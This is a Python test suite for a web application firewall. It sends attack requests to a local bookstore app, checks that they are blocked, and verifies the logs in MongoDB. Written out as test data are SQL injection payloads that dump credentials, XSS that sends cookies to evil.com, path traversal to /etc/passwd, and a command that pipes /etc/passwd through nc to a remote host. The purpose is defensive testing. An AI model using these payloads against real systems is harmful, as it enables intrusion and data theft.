import requests
import time
import json
import sys
import os

# Add backend directory to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from src.database.mongodb_connection import MongoDB

def main():
    print("=" * 70)
    print("MDEFENDER PRO: COMPREHENSIVE WAF SECURITY VALIDATION SUITE")
    print("Target: Bookstore Application (http://127.0.0.1:5005)")
    print("=" * 70)

    db = MongoDB()
    base_url = "http://127.0.0.1:5005"

    test_cases = [
        {
            "id": 1,
            "category": "Legitimate Traffic",
            "name": "Standard Store Browsing",
            "method": "GET",
            "url": f"{base_url}/api/books",
            "params": {},
            "body": None,
            "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            "expected_status": 200
        },
        {
            "id": 2,
            "category": "SQL Injection (SQLi)",
            "name": "Union Select Query Injection",
            "method": "GET",
            "url": f"{base_url}/api/books",
            "params": {"category": "' UNION SELECT null, username, password FROM users--"},
            "body": None,
            "headers": {"User-Agent": "Mozilla/5.0"},
            "expected_status": 403
        },
        {
            "id": 3,
            "category": "SQL Injection (SQLi)",
            "name": "Boolean Blind Tautology",
            "method": "GET",
            "url": f"{base_url}/api/books",
            "params": {"search": "book' OR 1=1--"},
            "body": None,
            "headers": {"User-Agent": "Mozilla/5.0"},
            "expected_status": 403
        },
        {
            "id": 4,
            "category": "Cross-Site Scripting (XSS)",
            "name": "Stored/Reflected Script Tag Injection",
            "method": "GET",
            "url": f"{base_url}/",
            "params": {"id": "<script>alert(document.cookie)</script>"},
            "body": None,
            "headers": {"User-Agent": "Mozilla/5.0"},
            "expected_status": 403
        },
        {
            "id": 5,
            "category": "Cross-Site Scripting (XSS)",
            "name": "HTML Event Handler Injection (onload/onerror)",
            "method": "GET",
            "url": f"{base_url}/api/books",
            "params": {"q": '<img src="x" onerror="fetch(\'http://evil.com/\'+document.cookie)"/>'},
            "body": None,
            "headers": {"User-Agent": "Mozilla/5.0"},
            "expected_status": 403
        },
        {
            "id": 6,
            "category": "Local File Inclusion (LFI) / Path Traversal",
            "name": "Directory Traversal Vector",
            "method": "GET",
            "url": f"{base_url}/api/books",
            "params": {"file": "../../../../etc/passwd"},
            "body": None,
            "headers": {"User-Agent": "Mozilla/5.0"},
            "expected_status": 403
        },
        {
            "id": 7,
            "category": "Remote Code Execution (RCE)",
            "name": "System Command Chaining",
            "method": "GET",
            "url": f"{base_url}/api/books",
            "params": {"filter": "; cat /etc/passwd | nc 10.0.0.1 4444"},
            "body": None,
            "headers": {"User-Agent": "Mozilla/5.0"},
            "expected_status": 403
        },
        {
            "id": 8,
            "category": "XSS in POST Request Body",
            "name": "JSON Payload Script Injection",
            "method": "POST",
            "url": f"{base_url}/api/books/create-book",
            "params": {},
            "body": {"title": "<script>evilAction()</script>", "description": "Hacked Description"},
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "expected_status": 403
        }
    ]

    results = []
    generated_ref_ids = []

    for tc in test_cases:
        print(f"\n[Test #{tc['id']}] {tc['category']} - {tc['name']}")
        t0 = time.time()
        try:
            if tc["method"] == "GET":
                resp = requests.get(tc["url"], params=tc["params"], headers=tc["headers"], timeout=8)
            else:
                resp = requests.post(tc["url"], json=tc["body"], headers=tc["headers"], timeout=8)
            
            elapsed_ms = (time.time() - t0) * 1000
            status = resp.status_code
            waf_status = resp.headers.get("x-mdefender-status")
            attack_type = resp.headers.get("x-mdefender-attack-type")
            ref_id = resp.headers.get("x-mdefender-ref")

            if ref_id:
                generated_ref_ids.append(ref_id)

            passed = (status == tc["expected_status"])
            
            if passed:
                if status == 403:
                    print(f"  [+] BLOCKED as expected (HTTP 403) in {elapsed_ms:.1f}ms")
                    print(f"      Attack Type Detected: {attack_type}")
                    print(f"      Incident Ref ID:      {ref_id}")
                    has_block_html = "403" in resp.text and ("Access Denied" in resp.text or "MDefender" in resp.text)
                    print(f"      Block Page Rendered:  {'YES' if has_block_html else 'NO'}")
                else:
                    print(f"  [+] ALLOWED as expected (HTTP 200) in {elapsed_ms:.1f}ms")
            else:
                print(f"  [-] FAILED: Expected HTTP {tc['expected_status']}, got HTTP {status}")

            results.append({"test": tc["name"], "passed": passed, "status": status, "ref_id": ref_id})

        except Exception as e:
            print(f"  [-] Connection error: {e}")
            results.append({"test": tc["name"], "passed": False, "status": 0, "error": str(e)})

    # Sleep 1s to allow background logging tasks to persist to MongoDB
    time.sleep(1.0)

    print("\n" + "=" * 70)
    print("VERIFYING WAF DATABASE CAPTURE & AUDIT LOGS IN MONGODB")
    print("=" * 70)

    total_passed = sum(1 for r in results if r["passed"])
    print(f"Total Tests Executed: {len(results)} | Passed: {total_passed}/{len(results)}")

    # Verify latest logs in db.attacks
    recent_attacks = list(db.attacks.find({}).sort("timestamp", -1).limit(6))
    print(f"\n[+] Recent WAF Attack Logs Captured in DB ({len(recent_attacks)} inspected):")
    for atk in recent_attacks:
        print(f"    - [{atk.get('timestamp')}] Status: {atk.get('status')} | Attack Type: {atk.get('attack_type')} | IP: {atk.get('ip')} | URL: {atk.get('url')}")

    # Verify website stats
    bookstore_site = db.websites.find_one({"domain": "bookstore.local"})
    if bookstore_site:
        print(f"\n[+] Bookstore Website Dashboard Stats in MongoDB:")
        print(f"    - Domain: {bookstore_site.get('domain')}")
        print(f"    - Total Requests Today: {bookstore_site.get('requests_today')}")
        print(f"    - Blocked Attacks Today: {bookstore_site.get('blocked_today')}")
        print(f"    - Status: {bookstore_site.get('status')} (Protection: {bookstore_site.get('protection_enabled')})")

    assert total_passed == len(results), f"Only {total_passed}/{len(results)} tests passed."
    print("\n[SUCCESS] ALL ATTACKS DETECTED & BLOCKED (HTTP 403) AND LOGGED IN WAF DASHBOARD!")

if __name__ == "__main__":
    main()
